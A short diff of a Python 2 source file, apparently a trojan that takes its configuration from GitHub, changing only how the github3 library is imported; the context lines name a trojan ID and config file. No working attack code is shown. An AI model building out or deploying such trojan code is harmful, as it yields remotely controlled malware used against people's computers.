@@ -7,8 +7,7 @@ import random
 import threading 
 import Queue
 import os
-
-from github3 import login
+import github3
 
 trojan_id = "abc"
 trojan_config = "%s.json" % trojan_id
